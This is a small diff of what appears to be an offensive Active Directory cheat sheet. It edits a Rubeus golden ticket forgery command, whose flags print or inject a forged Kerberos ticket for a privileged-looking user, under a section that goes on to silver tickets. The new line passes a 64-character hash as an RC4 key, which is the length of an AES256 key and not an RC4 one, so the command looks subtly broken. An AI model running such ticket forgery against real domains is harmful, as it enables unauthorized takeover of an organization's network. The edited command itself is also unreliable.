@@ -513,7 +513,7 @@ optional:
 - ```/ptt``` - inject ticket
 
 ```
-rubeus.exe golden /aes256:EA2344691D140975946372D18949706857EB9C5F65855B0E159E54260BEB365C /ldap /user:FakeUser123 /printcmd
+rubeus.exe golden /user:DAdmin123 /rc4:EA2344691D140975946372D18949706857EB9C5F65855B0E159E54260BEB365C /ldap /printcmd
 ```
 
 #### Silver:
